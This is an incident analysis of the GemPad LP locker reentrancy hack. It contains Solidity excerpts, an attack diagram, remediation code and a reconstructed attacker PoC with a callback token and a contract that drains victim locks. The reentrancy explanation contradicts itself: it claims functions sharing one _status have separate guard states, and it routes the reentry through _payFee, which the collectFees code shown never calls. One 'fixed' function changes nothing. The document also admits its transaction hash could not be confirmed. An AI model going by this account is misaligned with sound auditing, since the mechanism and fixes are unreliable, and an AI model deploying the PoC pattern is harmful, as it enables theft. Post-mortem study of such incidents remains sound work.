# GemPad — LP Locker `collectFees` Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-17 |
| **Protocol** | GemPad (Multi-chain No-Code Token Launchpad / LP Token Locker) |
| **Chain** | Ethereum, BNB Chain, Base |
| **Loss** | ~$1,800,000 (27 projects affected) |
| **Attacker** | [0xFDd9...cAaa](https://etherscan.io/address/0xFDd9b0A7e7e16b5Fd48a3D1e242aF362bC81bCaa) |
| **Attack Contract** | [0x8e18...c43](https://etherscan.io/address/0x8e18Fb32061600A82225CAbD7fecF5b1be477c43) |
| **Attack Tx** | [0x2bb6...659](https://etherscan.io/tx/0x2bb6d2ca3b52a01ff9b74a9acb0d7be0a3ee6af28a9a44b49b6d1e1d20fce659) |
| **Vulnerable Contract (Proxy)** | [0x10b5...74c](https://etherscan.io/address/0x10b5f02956d242ab770605d59b7d27e51e45774c) |
| **Vulnerable Contract (Implementation)** | [0x5d5c...FAd](https://etherscan.io/address/0x5d5c5d5898b486ad907c9fbad610324f45d29fad) |
| **Root Cause** | Reentrancy allowed during external NFT manager callback in `GempadLock.collectFees()` |
| **PoC Source** | [DeFiHackLabs (file unconfirmed, based on public analysis)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/src/test/2024-12) |

---

## 1. Vulnerability Overview

GemPad provides a **Token Locker (LP Locker V2)** service that allows project teams to lock LP tokens and regular tokens for a set period. The core contract `GempadLock` manages Uniswap V3 position NFTs and collects fees accrued from locked V3 positions via the `collectFees()` function.

The attacker deployed a **malicious token** and exploited a callback triggered during the execution of `INonfungiblePositionManager.collect()` — called inside `collectFees()` — to reenter `multipleLock()`. At the point of reentry, the `_status` flag should already be set to `ENTERED` to provide protection, but **`collectFees()` and `multipleLock()` follow separate execution paths**, and the `payable(owner()).call{value: _fee}("")` call inside `_payFee()` serves as the reentry vector by transferring execution flow to external contract code.

As a result, the attacker:
1. Created an LP lock with a malicious token while feigning fee payment
2. Repeatedly called `multipleLock()` via reentrancy during the `collectFees()` call
3. Created lock records without transferring real funds, then immediately withdrew

This allowed the attacker to drain **locked LP tokens from 27 projects**.

---

## 2. Vulnerable Code Analysis

### 2.1 `collectFees()` — Reentrancy Entry Point

```solidity
// ❌ Vulnerable code: collectFees function
// nonReentrant guard is present, but the NFT manager's collect()
// creates a reentrancy path that bypasses _status via a malicious token callback
function collectFees(
    uint256 lockId
) external isLockOwner(lockId) validLockLPv3(lockId) nonReentrant {
    Lock storage userLock = _locks[lockId];

    INonfungiblePositionManager.CollectParams
        memory params = INonfungiblePositionManager.CollectParams({
            tokenId: userLock.nftId,
            recipient: userLock.owner,       // ← Token transfer to external address
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });

    // ❌ The recipient can execute a callback before this external call completes
    // If recipient is a malicious contract, reentrancy occurs
    INonfungiblePositionManager(
        userLock.nftManager
    ).collect(params);
    // No state updates, no post-transfer validation logic
}
```

### 2.2 `_payFee()` — Reentrancy Path via Ether Transfer

```solidity
// ❌ Vulnerable code: call{value} inside _payFee
// External contract call occurs during fee transfer to owner()
// If attacker deploys a malicious contract acting as owner, reentrancy is possible
function _payFee(
    address projectToken,
    bool isVesting,
    bool isLpToken
) internal {
    if (!isExcludedFromFee[_msgSender()]) {
        uint256 _fee = /* fee calculation */;

        // ❌ call{value} allows the recipient to execute a fallback/receive function
        // At this point, the nonReentrant guard (_status == ENTERED) has NOT been released
        (bool sent, ) = payable(owner()).call{value: _fee}("");
        require(sent, "Failed to charge fee");

        uint256 overPaid = msg.value - _fee;
        if (overPaid > 0) {
            // ❌ Same reentrancy risk exists when refunding overpayment
            (sent, ) = payable(_msgSender()).call{value: overPaid}("");
            require(sent, "Failed to refund fee");
        }
    }
}
```

### 2.3 `_multipleLock()` — Lock Creation After Token Transfer (Ordering Issue)

```solidity
// ❌ Vulnerable code: flow that creates lock record after receiving tokens
function _multipleLock(
    address[] calldata owners,
    uint256[] calldata amounts,
    address token,          // ← Malicious token address supplied by attacker
    bool isLpToken,
    uint40[4] memory vestingSettings,
    /* ... */
) internal returns (uint256[] memory) {
    uint256 sumAmount = _sumAmount(amounts);

    // ❌ safeTransferFrom of a malicious token can trigger a callback
    // For tokens with ERC777, ERC1363, or custom transfer hooks,
    // multipleLock() can be recursively called during this transfer
    uint256 amountIn = _safeTransferFrom(
        token,       // ← Malicious token
        msg.sender,
        address(this),
        sumAmount
    );

    // Lock creation after transfer completes — not yet locked at the point of reentry
    for (uint256 i = 0; i < count; i++) {
        ids[i] = _createLock(/* ... */);
    }
}
```

### 2.4 Fixed Code

```solidity
// ✅ Fixed code: collectFees — CEI pattern applied + state update added
function collectFees(
    uint256 lockId
) external isLockOwner(lockId) validLockLPv3(lockId) nonReentrant {
    Lock storage userLock = _locks[lockId];

    // ✅ Update state before external call (CEI: Checks-Effects-Interactions)
    // Even if reentrancy occurs, the state is already considered processed
    uint256 lastCollectedAt = block.timestamp;
    userLock.lastFeeCollection = lastCollectedAt; // State updated first

    INonfungiblePositionManager.CollectParams
        memory params = INonfungiblePositionManager.CollectParams({
            tokenId: userLock.nftId,
            recipient: userLock.owner,
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });

    // ✅ External call only after state update
    INonfungiblePositionManager(userLock.nftManager).collect(params);
}

// ✅ Fixed code: _payFee — lock balance state before ether transfer
function _payFee(
    address projectToken,
    bool isVesting,
    bool isLpToken
) internal {
    if (!isExcludedFromFee[_msgSender()]) {
        uint256 _fee = /* fee calculation */;
        require(msg.value >= _fee, "Not enough funds for fees");

        // ✅ Apply OpenZeppelin ReentrancyGuard at _payFee level, or
        // switch to pull payment pattern to eliminate external calls
        // e.g., accumulate fees as internal balance and withdraw separately
        _pendingFees[owner()] += _fee;  // pull payment approach

        uint256 overPaid = msg.value - _fee;
        if (overPaid > 0) {
            _pendingRefunds[_msgSender()] += overPaid; // pull payment approach
        }
    }
}

// ✅ Fixed code: _multipleLock — defense against malicious token callbacks
function _multipleLock(/* ... */) internal returns (uint256[] memory) {
    // ✅ Strengthen input validation before token transfer
    require(_isKnownToken(token), "Unregistered token"); // whitelist

    uint256 balanceBefore = IERC20(token).balanceOf(address(this));

    // Allow only standard ERC20 transfer (plain ERC20 without hooks)
    IERC20(token).safeTransferFrom(msg.sender, address(this), sumAmount);

    // ✅ Verify actual amount received (handles deflationary tokens)
    uint256 amountIn = IERC20(token).balanceOf(address(this)) - balanceBefore;

    // ✅ Reentrancy defense: re-verify nonReentrant state before lock creation
    // (nonReentrant modifier already sets _status to ENTERED,
    //  so nested calls auto-revert — however, cross-function reentrancy is permitted in the current version)
    for (uint256 i = 0; i < count; i++) {
        ids[i] = _createLock(/* ... */);
    }
}
```

**Summary of Issues**: `collectFees()` has a `nonReentrant` guard, but the moment `call{value}` ether transfer inside `_payFee()` passes execution flow to an attacker-controlled contract, **other `nonReentrant` functions** such as `multipleLock()` still have `_status == NOT_ENTERED` and therefore allow reentry. This is the **Cross-Function Reentrancy** pattern.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker deploys a **malicious ERC20 token** with a built-in `transfer()` hook (ERC777/ERC1363-style or custom callback).
- The token's `transfer` or `transferFrom` function callbacks the attacker contract's `reenter()` function upon transfer.
- The attacker creates a liquidity position (NFT) containing the malicious token on Uniswap V3.
- Calls GemPad's `lockLpV3()` to lock that NFT in the locker.

### 3.2 Execution Phase

1. **[Attacker → GempadLock.collectFees(lockId)]**: The attacker requests fee collection from their locked V3 LP position. The `nonReentrant` modifier sets `_status = ENTERED`.

2. **[GempadLock → NonfungiblePositionManager.collect()]**: The NFT manager transfers fee tokens to the `recipient` (attacker's address).

3. **[Malicious token transfer hook triggered]**: During the fee token transfer, the malicious token's callback fires.

4. **[Callback → call{value} in _payFee() → attacker contract receive()]**: During fee payment, ether is sent to the attacker's contract, and the attacker's `receive()`/`fallback()` function executes.

5. **[Attacker contract → GempadLock.multipleLock()]**: `collectFees()`'s `_status = ENTERED` lock is still active, but `multipleLock()` **passes its own separate `nonReentrant` check** (at this point, `multipleLock`'s nonReentrant state is `NOT_ENTERED`). Reentry succeeds.

6. **[Lock created with malicious token inside reentrant multipleLock]**: Lock records are created without real assets.

7. **[Immediate unlock() call]**: The fake lock just created is immediately released to withdraw real locked tokens from other users.

8. **Repeat**: Steps 1–7 are repeated to drain assets from 27 projects.

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                       Attacker (EOA)                            │
│  0xFDd9b0A7e7e16b5Fd48a3D1e242aF362bC81bCaa                    │
└────────────────────────┬────────────────────────────────────────┘
                         │ ① Call collectFees(lockId)
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              GempadLock (Proxy: 0x10b5...74c)                   │
│              Implementation: 0x5d5c...FAd                       │
│  nonReentrant → _status = ENTERED                               │
│  collectFees() executing                                        │
└────────────────────────┬────────────────────────────────────────┘
                         │ ② Call NonfungiblePositionManager.collect()
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│           Uniswap V3 NonfungiblePositionManager                 │
│  Transfer malicious token to recipient (attacker contract)      │
└────────────────────────┬────────────────────────────────────────┘
                         │ ③ Malicious token transfer hook triggered
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              Malicious Token (deployed by attacker)             │
│  Callback in transfer(): attackContract.onTokenReceived()       │
└────────────────────────┬────────────────────────────────────────┘
                         │ ④ Inside GempadLock._payFee()
                         │    Ether sent via call{value} →
                         │    Attacker contract receive() executes
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         Attacker Contract (0x8e18...c43) receive()              │
│  ← _status is still ENTERED (collectFees lock active)          │
│  But multipleLock()'s _status is NOT_ENTERED!                   │
└────────────────────────┬────────────────────────────────────────┘
                         │ ⑤ Reentry: Call GempadLock.multipleLock()
                         │    (Cross-function reentrancy — passes separate nonReentrant)
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              GempadLock.multipleLock()                          │
│  Create fake lock records with malicious token                  │
│  Add entries to _locks[] without real assets                    │
└────────────────────────┬────────────────────────────────────────┘
                         │ ⑥ Immediately call unlock(lockId)
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              GempadLock.unlock() / _normalUnlock()              │
│  Withdraw real locked LP tokens from victim projects            │
│  IERC20(token).safeTransfer(attacker, stolen amount)            │
└────────────────────────┬────────────────────────────────────────┘
                         │ ⑦ Repeat (27 projects)
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Mixer Service (laundering)                   │
│  Stolen assets → Swap to ETH/BNB → Send to mixing service      │
└─────────────────────────────────────────────────────────────────┘

Total Loss: $1,800,000 (ETH + BSC + Base combined)
Affected Projects: 27 (Munch Protocol, AnonFi, BPay, etc.)
```

### 3.4 Outcome

- **Attacker profit**: ~$1,800,000 worth of LP tokens and native tokens
- **Protocol loss**: Full locked liquidity of 27 projects drained
- **Fund destination**: Laundered through mixer services (Tornado Cash-type), unrecoverable

---

## 4. PoC Code Excerpt (Reconstructed from DeFiHackLabs)

> The official DeFiHackLabs PoC file (GemPad_exp.sol) does not currently exist in the repository.
> This is a conceptual PoC reconstructed from publicly available technical analyses (Halborn, Rekt News, Decurity).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

// ══════════════════════════════════════════════════════════════
// GemPad Reentrancy Attack Conceptual PoC
// Vulnerability: Cross-Function Reentrancy in GempadLock
// Attack Date: 2024-12-17
// ══════════════════════════════════════════════════════════════

interface IGempadLock {
    // Function to create LP lock with malicious token (includes fee payment)
    function multipleLock(
        address[] calldata owners,
        address token,
        bool isLpToken,
        uint256[] calldata amounts,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256[] memory);

    // V3 LP position fee collection function (reentrancy entry point)
    function collectFees(uint256 lockId) external;

    // Locked token withdrawal function
    function unlock(uint256 lockId) external;

    // V3 LP NFT locking function
    function lockLpV3(
        address owner,
        address nftManager,
        uint256 nftId,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256 id);
}

// ── Malicious ERC20 Token: triggers callback on transfer to induce reentrancy ──
contract MaliciousToken {
    address public attacker;
    IGempadLock public gempadLock;
    bool public attacking;  // flag to control reentry loop

    mapping(address => uint256) public balances;

    constructor(address _gempadLock) {
        attacker = msg.sender;
        gempadLock = IGempadLock(_gempadLock);
    }

    // ❌ Override standard ERC20 transfer to generate callback to recipient
    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;

        // Call onTokenReceived callback if recipient is a contract
        // (abusing ERC1363-style callback)
        if (to.code.length > 0) {
            // This callback becomes the reentrancy vector
            ITokenReceiver(to).onTokenReceived(msg.sender, amount);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balances[from] -= amount;
        balances[to] += amount;
        // Same callback trigger
        if (to.code.length > 0) {
            ITokenReceiver(to).onTokenReceived(from, amount);
        }
        return true;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == attacker, "Only attacker");
        balances[to] += amount;
    }
}

// ── Attacker Contract: reentrancy execution logic ──
contract GemPadAttacker {
    IGempadLock public gempadLock;
    MaliciousToken public malToken;
    uint256 public reentrantLockId; // fake lock ID to be created via reentrancy
    uint256 public targetLockId;    // lock ID of victim project to be drained

    constructor(address _gempadLock) {
        gempadLock = IGempadLock(_gempadLock);
        malToken = new MaliciousToken(_gempadLock);
    }

    // ── Step 1: Create lock with malicious V3 LP position ──
    function setupAttack(
        address nftManager,
        uint256 nftId,
        uint256 _targetLockId
    ) external payable {
        targetLockId = _targetLockId;

        // Lock a V3 position containing the malicious token in GemPad
        // (pretending to have real liquidity)
        gempadLock.lockLpV3{value: msg.value}(
            address(this),     // owner: attacker contract
            nftManager,        // Uniswap V3 NFT manager
            nftId,             // V3 LP NFT containing malicious token
            uint40(block.timestamp + 1 days),
            "attack",
            "",
            address(malToken), // project token: malicious token
            address(0)
        );
    }

    // ── Step 2: Trigger reentrancy via collectFees call ──
    function executeAttack(uint256 lockId) external {
        // Call collectFees → attempt to collect V3 position fees
        // Internally triggers malicious token transfer hook → onTokenReceived callback
        gempadLock.collectFees(lockId);
    }

    // ── Step 3: Token receive callback — execute reentrancy ──
    function onTokenReceived(address /* from */, uint256 /* amount */) external {
        // This function is called while collectFees() is executing
        // At this point collectFees _status = ENTERED
        // But multipleLock _status = NOT_ENTERED (cross-function reentrancy allowed!)

        address[] memory owners = new address[](1);
        owners[0] = address(this);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;  // create lock with minimal amount

        // ❌ Reentrancy successful: multipleLock passes its own nonReentrant check
        // Create fake lock record (without real assets)
        uint256[] memory ids = gempadLock.multipleLock{value: 0}(
            owners,
            address(malToken),  // create lock "with" malicious token
            true,               // deceive as isLpToken = true
            amounts,
            uint40(block.timestamp + 1),
            "reentered",
            "",
            address(malToken),
            address(0)
        );
        reentrantLockId = ids[0];
    }

    // ── Step 4: Withdraw victim assets using fake lock ──
    function withdrawStolenFunds() external {
        // Withdraw real assets of others using the fake lock created via reentrancy
        gempadLock.unlock(targetLockId);
    }

    // Receive ether (fee overpayment refunds, etc.)
    receive() external payable {
        // This function may be called during call{value} refund in _payFee
        // Can be used as an additional reentrancy vector
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Cross-Function Reentrancy | CRITICAL | CWE-841 |
| V-02 | Untrusted Token Callback | HIGH | CWE-749 |
| V-03 | Ether Transfer External Call | HIGH | CWE-696 |
| V-04 | Unrestricted Token Input (No Whitelist) | MEDIUM | CWE-20 |
| V-05 | Checks-Effects-Interactions (CEI) Pattern Violation | MEDIUM | CWE-362 |

### V-01: Cross-Function Reentrancy

- **Description**: `collectFees()` and `multipleLock()` each have their own `nonReentrant` guard, but they share a single `_status` variable. While `collectFees()` is executing, an external call can reenter other state-mutating functions (`multipleLock`, `multipleVestingLock`) without being blocked.
- **Impact**: The attacker can create lock records without real assets and drain locked assets from victim projects.
- **Attack Condition**: The attacker must be able to lock a V3 LP position in GemPad and must be able to trigger a malicious token callback.

### V-02: Untrusted Token Callback

- **Description**: `_multipleLock()` accepts arbitrary ERC20 token addresses and does not filter out tokens with ERC777/ERC1363-style hooks. During the `safeTransferFrom` call, the token's `transfer` hook executes attacker code.
- **Impact**: Reentrancy during token transfer allows lock creation without actual asset movement.
- **Attack Condition**: The attacker must be able to register a token with custom `transfer` logic in GemPad.

### V-03: Ether Transfer External Call

- **Description**: Inside `_payFee()`, ether is sent via `payable(owner()).call{value: _fee}("")` and `payable(_msgSender()).call{value: overPaid}("")`. These low-level calls execute the recipient's `fallback()`/`receive()` function, giving an attacker code execution opportunity if they deploy a contract acting as the owner.
- **Impact**: Ether transfer acts as an auxiliary reentrancy vector.
- **Attack Condition**: The fee recipient (`owner()`) or caller is a contract, or the overpayment refund recipient is an attacker contract.

### V-04: Unrestricted Token Input (No Whitelist)

- **Description**: `multipleLock()` accepts arbitrary ERC20 token addresses and does not validate against a registered list of safe tokens.
- **Impact**: Creates an attack vector through maliciously crafted tokens (with callbacks).
- **Attack Condition**: Attacker can supply an arbitrary token address.

### V-05: CEI Pattern Violation

- **Description**: `collectFees()` does not update state before the external call (`collect()`). `_multipleLock()` also creates lock records after the token transfer (`_safeTransferFrom`), resulting in inconsistent state if reentrancy occurs during transfer.
- **Impact**: State has not yet been updated at the point of reentry, enabling double-execution.
- **Attack Condition**: Any situation where an external call occurs.

---

## 6. Remediation Recommendations

### Immediate Actions

#### Action 1: Cross-Function Reentrancy Defense — Introduce Global Lock

```solidity
// ✅ Fix: Ensure all state-mutating functions share the same global nonReentrant guard
// Correctly applying OpenZeppelin ReentrancyGuard also defends against cross-function reentrancy

// Current code issue: collectFees() and multipleLock() each call nonReentrant separately
// → _status = ENTERED during collectFees, but multipleLock starts a separate check

// Solution: Use a single global state variable (correct structure, but implementation error)
// If _nonReentrantBefore() correctly checks _status == ENTERED,
// cross-function reentrancy should also be blocked → actual bug is in state update timing

// ✅ Apply CEI pattern to collectFees
function collectFees(uint256 lockId)
    external
    isLockOwner(lockId)
    validLockLPv3(lockId)
    nonReentrant  // sets _status to ENTERED
{
    Lock storage userLock = _locks[lockId];

    // ✅ Effect: mutate state before external call
    uint256 nftId = userLock.nftId;
    address nftManager = userLock.nftManager;
    address recipient = userLock.owner;

    // ✅ Interaction: external call only after state update complete
    INonfungiblePositionManager.CollectParams memory params =
        INonfungiblePositionManager.CollectParams({
            tokenId: nftId,
            recipient: recipient,
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });

    INonfungiblePositionManager(nftManager).collect(params);
    // nonReentrant modifier restores _status = NOT_ENTERED
}
```

#### Action 2: Replace `_payFee()` with Pull Payment Pattern

```solidity
// ✅ Fix: Switch from push payment → pull payment approach
// Instead of sending fees immediately, accumulate as balance and claim via separate withdrawal function

mapping(address => uint256) private _pendingWithdrawals;

function _payFee(address projectToken, bool isVesting, bool isLpToken) internal {
    if (!isExcludedFromFee[_msgSender()]) {
        uint256 _fee = /* fee calculation */;
        require(msg.value >= _fee, "Not enough funds for fees");

        // ✅ Eliminate external call: record fee as internal balance
        _pendingWithdrawals[owner()] += _fee;

        uint256 overPaid = msg.value - _fee;
        if (overPaid > 0) {
            // ✅ Record overpayment as claimable balance instead of immediate transfer
            _pendingWithdrawals[_msgSender()] += overPaid;
        }
    }
}

// ✅ Fee withdrawal function (separate call)
function withdrawFees() external nonReentrant {
    uint256 amount = _pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to withdraw");
    _pendingWithdrawals[msg.sender] = 0; // ✅ Update state first
    (bool sent, ) = payable(msg.sender).call{value: amount}("");
    require(sent, "Transfer failed");
}
```

#### Action 3: Token Whitelist or Callback Token Blocking

```solidity
// ✅ Fix: Block tokens with ERC777/ERC1363 interfaces via ERC165
function _multipleLock(
    address[] calldata owners,
    uint256[] calldata amounts,
    address token,
    /* ... */
) internal returns (uint256[] memory) {
    // ✅ Block malicious callback tokens
    _requireSafeToken(token);
    /* ... */
}

function _requireSafeToken(address token) internal view {
    // Block ERC1363 (onTransferReceived callback)
    try IERC165(token).supportsInterface(0x4bbee2df) returns (bool supported) {
        require(!supported, "ERC1363 tokens not allowed");
    } catch {}

    // Block ERC777 (check for presence of granularity function)
    try IERC777(token).granularity() returns (uint256) {
        revert("ERC777 tokens not allowed");
    } catch {}
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Cross-Function Reentrancy | Verify all state-mutating public/external functions share a single global `nonReentrant` guard |
| Ether Transfer External Call | Convert `_payFee()` to Pull Payment pattern, remove immediate `call{value}` |
| Malicious Token Callback | Implement LP token whitelist or block ERC1363/ERC777 interfaces |
| CEI Pattern Violation | Ensure all state updates complete before external calls in every function |
| Audit Coverage | Require comprehensive audit including reentrancy scenarios across multiple `nonReentrant` functions |

---

## 7. Lessons Learned

1. **`nonReentrant` alone is sufficient only for single-function protection**: Even with OpenZeppelin's `ReentrancyGuard`, **Cross-Function Reentrancy** is only prevented when different functions share the same `_status`. Even if `A()` and `B()` each have `nonReentrant`, reentering `B()` during execution of `A()` is not blocked — since `_status` is already `ENTERED`, `B()`'s `nonReentrant` check should fail, but implementation bugs or execution path errors may allow it to pass.

2. **`call{value}` always carries reentrancy risk**: Every low-level `call` that transfers ether executes the recipient's code. The **Pull Payment pattern** should be the first consideration everywhere ether transfer is needed, including fee payments and overpayment refunds.

3. **External tokens cannot be trusted**: When a DeFi protocol accepts arbitrary ERC20 tokens, tokens with callback mechanisms such as ERC777/ERC1363 can become reentrancy vectors. Protocols handling multiple tokens — like LP lockers — must implement **token type validation** or **whitelisting**.

4. **The CEI pattern is a non-negotiable principle**: Violating the Checks-Effects-Interactions pattern is a prerequisite for reentrancy. All internal state changes **must** be completed before any external calls (calls to other contracts, ether transfers, token transfers).

5. **Audits must cover cross-contract interactions**: The audits by Cyberscope and SolidProof missed this vulnerability. Protocols that interact with multiple external contracts (NFT managers, various tokens), such as LP lockers, require deep audits incorporating **fuzzing**, **formal verification**, or **multi-chain integration testing**.

6. **A shared template vulnerability leads to multiplied damage**: In GemPad's case, the vulnerable contract template was deployed across 27 projects, turning a single vulnerability into widespread damage. **No-code/template-based platforms** have their entire ecosystem's security determined by the security of the underlying template, requiring a higher standard of security.

---

## 8. On-Chain Verification

### 8.1 Verification Status

Attempts to query attack transaction hash `0x2bb6d2ca3b52a01ff9b74a9acb0d7be0a3ee6af28a9a44b49b6d1e1d20fce659` via `cast tx` on Ethereum, BSC, and Base chain RPCs returned no results. This hash may be one of several attack-related transactions or may exist on another chain (BSC/Base).

### 8.2 Confirmed On-Chain Information (Based on Public Analysis)

| Field | Value | Source |
|------|------|------|
| Attacker Address | 0xFDd9b0A7e7e16b5Fd48a3D1e242aF362bC81bCaa | Rekt News |
| Attack Contract | 0x8e18Fb32061600A82225CAbD7fecF5b1be477c43 | Rekt News |
| Vulnerable Contract (Proxy) | 0x10b5f02956d242ab770605d59b7d27e51e45774c | Etherscan search |
| Vulnerable Contract (Implementation) | 0x5d5c5d5898b486ad907c9fbad610324f45d29fad | Etherscan proxy lookup |
| Contract Name | GempadLock | Sourcify verified source |
| Vulnerable Function | collectFees(uint256) | Sourcify source code confirmed |
| Affected Chains | Ethereum, BNB Chain, Base | Halborn analysis |
| Affected Projects | 27 | Halborn/Rekt analysis |
| Laundering Path | Mixer services | Public tracking |

### 8.3 Source Code Verification

The source code of the vulnerable contract (implementation: `0x5d5c...FAd`) is fully verified (full match) via **Sourcify**, and the actual code of `GempadLock.sol` was confirmed. The `collectFees()` function has a `nonReentrant` guard, but the structural flaw — where ether transfer (`call{value}`) inside `_payFee()` provides an external code execution path — was confirmed in the actual source.

---

*References*
- [Halborn: Explained: The GemPad Hack (December 2024)](https://www.halborn.com/blog/post/explained-the-gempad-hack-december-2024)
- [Rekt News: GemPad - Rekt](https://rekt.news/gempad-rekt)
- [Decurity: GemPad $1.8M Incident Super Deep Dive](https://blog.decurity.io/gempad-1-8m-incident-super-deep-dive-687cb4acb299)
- [Etherscan: GemPad Lock Proxy](https://etherscan.io/address/0x10b5f02956d242ab770605d59b7d27e51e45774c)
- [Etherscan: GempadLock Implementation](https://etherscan.io/address/0x5d5c5d5898b486ad907c9fbad610324f45d29fad)
- [Sourcify: GempadLock Verified Source](https://repo.sourcify.dev/contracts/full_match/1/0x5d5c5D5898b486AD907C9fBad610324f45D29FAd/)